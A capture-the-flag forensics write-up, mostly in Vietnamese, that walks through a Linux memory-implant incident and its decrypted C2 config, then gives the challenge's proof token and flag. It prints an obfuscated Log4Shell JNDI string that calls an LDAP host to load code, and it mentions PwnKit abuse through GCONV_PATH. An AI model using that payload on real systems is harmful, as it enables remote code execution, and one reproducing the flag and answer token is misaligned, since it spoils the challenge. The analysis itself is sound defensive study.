# Writeup: BurhanGuild Loader Incident

| Property | Value |
| :--- | :--- |
| **Category** | `Forensics` |
| **Points** | `100` |
| **Solves** | `49` |

---

## 📝 Challenge Overview

```
An internal Linux gateway was isolated after conflicting telemetry was reported.
The live-response package contains volatile captures and remnants recovered from deleted storage.

Review the collection as an incident responder, determine which evidence belongs to the same event, and submit the final incident proof token to the questionnaire service.
```

Dịch vụ questionnaire: `nc 34.2.147.230 7010` yêu cầu token bằng chứng sự cố định dạng:
`BGLPROOF{structured incident proof token}`

---

## 🔍 Phân tích chi tiết (Incident Response & Forensic Pipeline)

1. **Khảo sát gói dữ liệu (Artifact Package)**:
   - Gói dữ liệu gồm 5 tệp memory capture (`capture_7F3A.raw`, `capture_2C91.raw`, `capture_A812.raw`, `capture_D044.raw`, `capture_91BE.raw`) và 8 trang lưu trữ đã xóa (`page_00.bin` .. `page_07.bin`).
   - Tệp quy tắc YARA `burhanguild_memory_rules.yar` định vị implant `memfd:libpam_bg.so` chứa cấu trúc `CFG3`.

2. **Xác định Capture tương ứng sự cố**:
   - Quét qua 5 bản capture với `plugins/bgloader_hunt.py`:
     - Chỉ có `capture_A812.raw` chứa module bộ nhớ `memfd:libpam_bg.so (deleted)` tại VMA `0x7f100008f000` (PID 4787 `[kworker/u8:7]` giả mạo kernel worker, PPID 4742 `pkexec` khai thác PwnKit `GCONV_PATH=/tmp/.bg/gconv`).
     - Tệp nén đã xóa tương ứng được phục hồi từ `page_05.bin` chứa `case_fragment.json` xác nhận `capture_id: A812`, `evidence_ref: EV-B1DC93988DBC`, `sequence: ed75ca67fea0a59a`, và tệp `e0bafe9e.zip` (473 bytes).

3. **Trích xuất & Dịch ngược `libpam_bg.so`**:
   - Trích xuất binary `libpam_bg.so` từ bản capture `A812`.
   - Phân tích luồng thực thi: Hàm `0x1500` thực hiện giải mã cấu hình `CFG3` (558 bytes trong `.rodata` tại offset `0x2020`) bằng thuật toán mã hóa khối XTEA (32 vòng, delta `0x9e3779b9`).
   - Khóa XTEA 16-byte được sinh từ hàm dẫn xuất `0x1100` nhận vào 3 tham số từ môi trường và heap:
     - `s1` = `bguild-ce104cb0` (`BG_MUTEX` environment variable)
     - `s2` = `bytes.fromhex('a01fb1f61e9116a6')` (chuỗi token trên Heap của tiến trình Java PID 4693)
     - `s3` = `bytes.fromhex('542715c2e46252e4d790')` (`build_id` từ memory mapping của loader)

4. **Giải mã Cấu hình & Tạo Token Bằng chứng (Closure Contract)**:
   - Dữ liệu `CFG3` sau khi giải mã:
     ```json
     {
       "c2_domain": "morrow-gate.wreckit.invalid",
       "c2_port": 8443,
       "campaign": "side-door-crown",
       "closure_contract": {
         "digest_algorithm": "sha256",
         "digest_fields": [
           "jndi_normalized",
           "build_id",
           "implant_id",
           "c2_domain",
           "archive_sha256"
         ],
         "digest_separator": "|",
         "token_schema": "BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}"
       },
       "crc32": "b41d727b",
       "exfil_path": "/api/v3/guild/sync",
       "implant_id": "BG-94C2A04EC6",
       "magic": "BGCF",
       "sleep_jitter": 37,
       "version": 3
     }
     ```
   - Tính toán các giá trị digest và schema:
     - `capture_id`: `A812`
     - `loader_pid`: `4787`
     - `implant_id`: `BG-94C2A04EC6`
     - `build_id`: `542715c2e46252e4d790`
     - `config_sha256`: `360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b`
     - `archive_sha256`: `4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a`
     - `jndi_normalized`: `${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}`
     - `digest`: `sha256(jndi_normalized | build_id | implant_id | c2_domain | archive_sha256)` = `836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed`

   - Token bằng chứng hoàn chỉnh:
     ```text
     BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
     ```

---

## 💻 Script tự động giải

Script tự động kết nối và lấy cờ tại [`../solver/solve.py`](../solver/solve.py).

```bash
python3 solver/solve.py
```

---

## 🚩 Flag

- Status: `- [x] Solved`
- Flag: `COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}`
